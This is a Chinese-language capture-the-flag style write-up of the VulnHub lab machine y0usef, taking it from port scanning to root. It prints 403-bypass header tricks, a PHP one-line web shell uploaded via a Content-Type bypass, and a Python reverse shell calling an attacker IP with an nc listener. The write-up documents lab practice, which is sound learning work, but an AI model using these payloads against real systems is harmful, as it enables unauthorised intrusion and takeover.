@@ -1,0 +1,163 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>  · Patrik's Blog</title><meta name="description" content=" - Patrik"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://example.com/atom.xml" title="Patrik's Blog"><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Patrik's Blog" type="application/atom+xml">
+</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="http://www.bing.com" target="_blank" class="nav-list-link">WEIBO</a></li><li class="nav-list-item"><a href="https://github.com/byesec" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title"></h1><div class="post-info">2021年2月8日</div><div class="post-content"><blockquote>
+<p><strong>靶机地址：</strong><a target="_blank" rel="noopener" href="https://download.vulnhub.com/y0usef/y0usef.ova">https://download.vulnhub.com/y0usef/y0usef.ova</a></p>
+<p><strong>难度等级：</strong>低</p>
+<p><strong>打靶目标：</strong>取得 root 权限 + 2 Flag</p>
+</blockquote>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216093012124.png" alt="image-20220216093012124"></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 192.168.137.233</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216093201459.png" alt="image-20220216093201459"></p>
+<h3 id="服务探测"><a href="#服务探测" class="headerlink" title="服务探测"></a>服务探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,80-sV -sC 192.168.137.233</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216093937980.png" alt="image-20220216093937980"></p>
+<h2 id="二、漏洞发现"><a href="#二、漏洞发现" class="headerlink" title="二、漏洞发现"></a>二、漏洞发现</h2><h3 id="访问80端口"><a href="#访问80端口" class="headerlink" title="访问80端口"></a>访问80端口</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216094324955.png" alt="image-20220216094324955"></p>
+<p>页面提示该网站正在建设中，但它已经在运行</p>
+<h4 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h4><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216094548943.png" alt="image-20220216094548943"></p>
+<p>也并未发现有帮助的信息</p>
+<h4 id="whatweb网站指纹识别"><a href="#whatweb网站指纹识别" class="headerlink" title="whatweb网站指纹识别"></a>whatweb网站指纹识别</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.137.233</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216094848943.png" alt="image-20220216094848943"></p>
+<h4 id="dirsearch目录扫描"><a href="#dirsearch目录扫描" class="headerlink" title="dirsearch目录扫描"></a>dirsearch目录扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.137.233</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216095152430.png" alt="image-20220216095152430"></p>
+<p>结果显示了大量403响应码，也就意味着目标服务器上存在这些目录&#x2F;文件，但是因权限不足不能访问。</p>
+<blockquote>
+<p>403错误是网站访问过程中，常见的错误提示。资源不可用，服务器理解客户的请求，但拒绝处理它。通常由于服务器上文件或目录的权限设置导致，比如IIS或者apache设置了访问权限不当。</p>
+</blockquote>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.137.233/adminstration/">http://192.168.137.233/adminstration/</a></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216095610319.png" alt="image-20220216095610319"></p>
+<p>可能网站的管理者对权限进行了一些限制管理，那接下来该如何解决403呢？</p>
+<h4 id="403Bypass"><a href="#403Bypass" class="headerlink" title="403Bypass"></a>403Bypass</h4><p>抓取页面请求的包发送到Burp内的Repeater</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216100952570.png" alt="image-20220216100952570"></p>
+<h5 id="常见的4种403Bypass"><a href="#常见的4种403Bypass" class="headerlink" title="常见的4种403Bypass"></a>常见的4种403Bypass</h5><h6 id="使用旁站绕过403"><a href="#使用旁站绕过403" class="headerlink" title="使用旁站绕过403"></a>使用旁站绕过403</h6><blockquote>
+<p>例：</p>
+<p>如下是一个正常的请求响应403过程</p>
+<p>#Request</p>
+<p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1</p>
+<p> Host:<a target="_blank" rel="noopener" href="http://www.abc.com/">www.abc.com</a>                   <strong>#请求头</strong></p>
+<p>#Response</p>
+<p> HTTP&#x2F;1.1 403 Forbidden</p>
+<p>针对旁站进行修改</p>
+<p>#Request</p>
+<p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1</p>
+<p> Host: $<strong>xxx</strong>$.abc.com                    <strong>#替换主机名</strong></p>
+<p>#Response</p>
+<p> HTTP&#x2F;1.1 200 OK</p>
+<p>说明：如果服务器在进行ACL访问控制时，对访问<code>http://IP/auth/login</code>是验证<strong>请求头Host</strong>，那么尝试修改其<strong>请求头Host的头部</strong>，服务器会认为是<strong>企业内部的另外一台机器</strong>对<code>http://IP/auth/login</code>的正常访问，则可能利用此验证机制绕过403限制。</p>
+</blockquote>
+<h6 id="使用覆盖URL的方式绕过403"><a href="#使用覆盖URL的方式绕过403" class="headerlink" title="使用覆盖URL的方式绕过403"></a>使用覆盖URL的方式绕过403</h6><blockquote>
+<p>例：</p>
+<p>如下是一个正常的请求响应403过程</p>
+<p>#Request</p>
+<p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1                 <strong>#请求行</strong></p>
+<p>#Response</p>
+<p> HTTP&#x2F;1.1 403 Forbidden</p>
+<p>覆盖URL</p>
+<p>#Request</p>
+<p> GET &#x2F; HTTP&#x2F;1.1</p>
+<p> X-Original-URL: &#x2F;auth&#x2F;login               <strong>#覆盖URL</strong></p>
+<p>#Response</p>
+<p> HTTP&#x2F;1.1 200 OK</p>
+<p>说明：如果服务器在进行ACL访问控制时，对访问<code>http://IP/auth/login</code>是验证请求行URL，那么尝试<strong>添加非标准的HTTP头</strong>（例如X-Original-URL、X-Rewrite-URL），<strong>来覆盖&#x2F;重写原始请求行中的URL</strong>，尝试使用该方法绕过403权限限制检查。</p>
+</blockquote>
+<h6 id="利用Referer头部绕过403"><a href="#利用Referer头部绕过403" class="headerlink" title="利用Referer头部绕过403"></a>利用Referer头部绕过403</h6><blockquote>
+<p>例：</p>
+<p>如下是一个正常的请求响应403过程</p>
+<p>#Request</p>
+<p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1            </p>
+<p>#Response</p>
+<p> HTTP&#x2F;1.1 403 Forbidden</p>
+<p>覆盖URL</p>
+<p>#Request</p>
+<p> GET &#x2F; HTTP&#x2F;1.1</p>
+<p> Referer: <a target="_blank" rel="noopener" href="https://ip/auth/login">https://IP/auth/login</a>      <strong>#来源页面</strong></p>
+<p>#Response</p>
+<p> HTTP&#x2F;1.1 200 OK</p>
+<p>补充：也可以使用<strong>Referer头部</strong>（Referer包含一个URL，代表当前访问URL的上一个URL，也就是说，用户是从什么地方来到本页面。如<code>http://IP/login.php</code>，即代表用户从login.php来到当前页面），如果<strong>Referer头部</strong>内的URL是一个<strong>需要较高权限才可访问的URL</strong>，若服务器会根据<strong>Referer头部</strong>来判断的话，则会认为<strong>是已经验证过的权限用户</strong>，可直接访问当前要访问的页面，可借此绕过403.</p>
+</blockquote>
+<h6 id="利用反向代理绕过403"><a href="#利用反向代理绕过403" class="headerlink" title="利用反向代理绕过403"></a>利用反向代理绕过403</h6><blockquote>
+<p>例：</p>
+<p>如下是一个正常的请求响应403过程</p>
+<p>#Request</p>
+<p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1</p>
+<p> Host: 192.168.137.233                 </p>
+<p>#Response</p>
+<p> HTTP&#x2F;1.1 403 Forbidden</p>
+<p>针对旁站进行修改</p>
+<p>#Request</p>
+<p> GET &#x2F;auth&#x2F;login HTTP&#x2F;1.1</p>
+<p> Host: 192.168.137.233   </p>
+<p> X-Originating-IP: 127.0.0.1           <strong>#代理本地</strong></p>
+<p>#Response</p>
+<p> HTTP&#x2F;1.1 200 OK</p>
+<p>说明：如果服务器在进行ACL访问控制时，那么尝试<strong>添加非标准的HTTP头</strong>（例如X-Originating-IP、X-Remote-IP、X-Forwarded-For），<strong>来使服务器认为请求来自服务器本地</strong>，尝试使用该方法绕过403权限限制检查。</p>
+</blockquote>
+<p>经过对以上4种方法的逐一尝试，最终<strong>利用反向代理绕过403</strong></p>
+<h5 id="反向代理403Bypass"><a href="#反向代理403Bypass" class="headerlink" title="反向代理403Bypass"></a>反向代理403Bypass</h5><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216112556365.png" alt="image-20220216112556365"></p>
+<p>将其放入Intrueder中Forward包</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216112723612.png" alt="image-20220216112723612"></p>
+<p>页面跳转至登陆表单</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216112808474.png" alt="image-20220216112808474"></p>
+<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>经过尝试发现该表单账号密码都为弱口令admin</p>
+<p>尝试提交用户名密码并进行抓包（须在每一次请求时添加X-Forwarded-For绕过403）</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216113139211.png" alt="image-20220216113139211"></p>
+<p>进入了后台页面，发现好像有上传页面</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216113517608.png" alt="image-20220216113517608"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216113658637.png" alt="image-20220216113658637"></p>
+<p>写一句话木马a.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $var=shell_exec($_GET[&#x27;cmd&#x27;]); echo $var ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216114951617.png" alt="image-20220216114951617"></p>
+<p>初次上传发现服务端有对上传文件的校验</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115137076.png" alt="image-20220216115137076"></p>
+<p>经过尝试修改Content-Type即可绕过上传成功</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115304086.png" alt="image-20220216115304086"></p>
+<p>访问a.php（上传后修改了名字）</p>
+<p><code>http://192.168.137.233/adminstration/upload/files/1644983531a.php</code></p>
+<p>记得添加X-Forwarded-For绕过403</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115527530.png" alt="image-20220216115527530"></p>
+<p>页面访问成功为空</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115622776.png" alt="image-20220216115622776"></p>
+<p>尝试执行命令</p>
+<p>查看当前用户</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115804186.png" alt="image-20220216115804186"></p>
+<p>为普通权限用户</p>
+<h2 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h2><h3 id="查看目标服务器上是否有python"><a href="#查看目标服务器上是否有python" class="headerlink" title="查看目标服务器上是否有python"></a>查看目标服务器上是否有python</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216120212970.png" alt="image-20220216120212970"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.137.22&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>kali开启侦听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143055578.png" alt="image-20220216143055578"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216142807426.png" alt="image-20220216142807426"></p>
+<p>成功反弹shell</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143312167.png" alt="image-20220216143312167"></p>
+<p>查看&#x2F;etc&#x2F;passwd文件</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143455257.png" alt="image-20220216143455257"></p>
+<p>查看&#x2F;home目录</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143717439.png" alt="image-20220216143717439"></p>
+<p>拿到第一个flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=</span><br></pre></td></tr></table></figure>
+
+<h3 id="SSH登陆"><a href="#SSH登陆" class="headerlink" title="SSH登陆"></a>SSH登陆</h3><p>尝试base64解码</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143832430.png" alt="image-20220216143832430"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh : </span><br><span class="line">user : yousef </span><br><span class="line">pass : yousef123</span><br></pre></td></tr></table></figure>
+
+<p>解码完成后信息显示是ssh的账号密码（之前端口扫描确实存在22端口的ssh）</p>
+<p>尝试连接</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216144327107.png" alt="image-20220216144327107"></p>
+<h3 id="利用sudo提权"><a href="#利用sudo提权" class="headerlink" title="利用sudo提权"></a>利用sudo提权</h3><p>用户yousef有sudo权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>发现可以sudo执行所有命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216144942569.png" alt="image-20220216144942569"></p>
+<p>(这里提权太简单了..)</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216145157998.png" alt="image-20220216145157998"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216145226424.png" alt="image-20220216145226424"></p>
+</div></article></div></main><footer><div class="paginator"><a href="/2021/11/30/week5/" class="prev">PREV</a><a href="/2021/02/08/week9/" class="next">NEXT</a></div><div class="copyright"><p>© 2021 - 2022 <a href="http://example.com">Patrik</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>
